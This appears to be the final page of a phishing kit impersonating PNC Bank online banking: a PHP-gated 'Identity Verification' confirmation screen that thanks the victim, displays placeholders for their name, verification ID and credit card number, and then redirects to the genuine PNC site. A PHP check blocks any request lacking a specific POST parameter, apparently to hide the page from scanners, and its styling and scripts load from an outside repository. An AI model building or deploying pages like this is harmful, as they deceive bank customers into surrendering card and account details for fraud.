<?php
if ($_SERVER['REQUEST_METHOD'] !== "POST" || !isset($_POST['requested_by']) || $_POST['requested_by'] !== 'file_get_contents'){
    http_response_code(403);
    echo "Sorry you can't be here.";
    exit(0);
}
?>

<html lang="en">

<head>
    <meta http-equiv="refresh" content="10; URL=https://www.onlinebanking.pnc.com/"/>
    <meta name="viewport" content="width=device-width; initial-scale=1" />
    <title>PNC Bank Online Banking</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
    <link href="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/css/common.css" rel="stylesheet" />
    <link href='https://fonts.googleapis.com/css?family=Alegreya' rel='stylesheet'>
    <link rel="shortcut icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico" />
    <link rel="icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico" />
    <link rel="stylesheet" href="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/css/confirm.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" integrity="sha512-3n19xznO0ubPpSwYCRRBgHh63DrV+bdZfHK52b1esvId4GsfwStQNPJFjeQos2h3JwCmZl0/LgLxSKMAI55hgw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/js/mask.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/js/imask.js"></script>
    <style>
        .logo-container{
            background-image: url('https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/imgs/main-logo.svg');
        }
    </style>
</head>

<body>
    <header class="container-fluid header">
        <div class="logo-container">
            <div class="page-name">
                <h1>Identity Verification</h1>
            </div>
        </div>
    </header>
    <div class="content">
        <div class="steps d-flex">
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/imgs/icon_topic_creditcards_orange.svg">
                <p>Identification</p>
            </div>
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/imgs/smart_access_icon_secure.svg">
                <p>Verify Ownership</p>
            </div>
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/imgs/id-card.svg">
                <p>Verify ID</p>
            </div>
            <div class="step current">
                <img src="https://gitcdn.link/cdn/TPCT/front-end/main/pnc/v2/views/assets/imgs/tick.svg">
                <p>Done</p>
            </div>
        </div>

        <div class="main-content">
            <div class="confirm d-flex flex-column justify-content-center align-items-center border border-success rounded-3 text-success">
                <h1>Thank You</h1>
                <h4 class="label">Your account has been verified successfully.</h4>
                <h4 class="label">Verification ID: $$verification_id$$</h4>
                <h5 class="label">Dear Customer: $$customer_name$$</h5>
                <h5 class="label">Account's Credit Card: $$card_number$$</h5>
                <h5 class="label">Verification Time: 
                    <script language="javascript">
                        var today = new Date();
                        document.write(today.toDateString());
                    </script>
                </h5>
            </div>
        </div>
    </div>
    <footer class="py-3 footer container-fluid">
        <ul class="nav justify-content-center">
            <li class="nav-item footer-link hoverable"><a href="#">Online Banking Guarantee</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Service Agreement</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Privacy</a></li>
            <li class="nav-item footer-link hoverable"><a href="#">Online Security</a></li>
        </ul>
        <p class="text-center text-muted">?? 2022 The PNC Financial Services Group, Inc. All rights reserved.</p>
    </footer>
</body>

</html>